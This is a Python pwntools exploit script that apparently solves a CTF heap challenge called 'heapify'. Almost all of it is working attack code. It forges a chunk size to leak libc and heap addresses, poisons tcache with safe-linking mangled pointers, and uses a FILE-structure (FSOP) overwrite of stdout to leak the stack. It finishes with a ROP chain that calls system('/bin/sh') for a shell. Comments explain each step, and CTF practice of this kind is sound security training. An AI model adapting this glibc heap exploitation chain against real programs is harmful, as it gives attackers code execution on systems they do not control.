#!/usr/bin/env python3

from pwn import *

exe = ELF("./heapify_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

serv = "challs.actf.co"
port = 31501

context.binary = exe

def conn():
    if args.REMOTE:
        r = remote(serv, port)
    else:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript="""
                b *$pie+0x000012f0 
                b *$pie+0x000013e6
            """)
    return r

r = conn()

def add(size, data=b"A", getidx=True):
    r.sendlineafter(b"choice: ", b"1")
    r.sendlineafter(b"size: ", str(size).encode())
    r.sendlineafter(b"data: ", data)
    if not getidx:
        return
    r.recvuntil(b"index: ")
    return int(r.recvline())

def free(idx):
    r.sendlineafter(b"choice: ", b"2")
    r.sendlineafter(b"index: ", str(idx).encode())

def view(idx):
    r.sendlineafter(b"choice: ", b"3")
    r.sendlineafter(b"index: ", str(idx).encode())

def mangle(ptr, pos):
    return (pos >> 12) ^ ptr

def main():
    # the vuln is arbitrary heap overflow.
    # first we need leaks, but freed chunk pointers are zeroed.
    # let's start by forging the size of a chunk so it
    # encompasses other allocated chunks when we free it
    add(0x18)
    base = add(0x18)
    add(0x1000)
    add(0x7f0)
    add(0x7f0)
    add(0x18)
    free(base)
    add(0x18, b"A"*0x18 + p64(0x2011))
    free(base+1)
    # now malloc thinks there is a 0x2010 sized free chunk,
    # but within this free chunk we still have two allocated
    # chunks that we can read from.
    # if we now allocate another chunk, it will
    # partition the free chunk, and the free list pointers will be
    # relocated on top of our viewable chunks if we choose the right sizes
    add(0xff0)
    add(0x800)
    view(base+3)
    libc.address = u64(r.recvline().strip().ljust(8, b"\x00"))-0x21ace0
    log.info(f"{hex(libc.address)=}")
    view(base+2)
    heap = u64(r.recvline().strip().ljust(8, b"\x00"))+0x1210
    log.info(f"{hex(heap)=}")
    # now with leaks we can get arbitrary write with tcache poisoning,
    # used FSOP for stack leak and then ROP
    buf = p64(libc.sym._IO_2_1_stdout_+0x83)
    fsop = p64(0xfbad2887)
    fsop += buf + p64(libc.sym.environ)
    fsop += buf + p64(libc.sym.environ)
    fsop += p64(libc.sym.environ+8)
    add(0x7f0)
    base = add(0xf8)
    add(0xf8)
    add(0xf8)
    free(base+2)
    free(base+1)
    free(base)
    add(0xf8, b"A"*0x100 + p64(mangle(libc.sym._IO_2_1_stdout_, heap)))
    add(0xf8)
    add(0xf8, fsop, False)
    stack = u64(r.recv(8))-0x128
    log.info(f"{hex(stack)=}")
    base = add(0x28)
    add(0x28)
    add(0x28)
    free(base+2)
    free(base+1)
    free(base)
    add(0x28, b"A"*0x30 + p64(mangle(stack, heap)))
    add(0x28)
    poprdi = libc.address+0x2a3e5
    binsh = next(libc.search(b"/bin/sh\x00"))
    add(0x28, p64(0) + p64(poprdi) + p64(binsh) + p64(poprdi+1) + p64(libc.sym.system))
    r.sendline(b"gg")
    r.interactive()


if __name__ == "__main__":
    main()
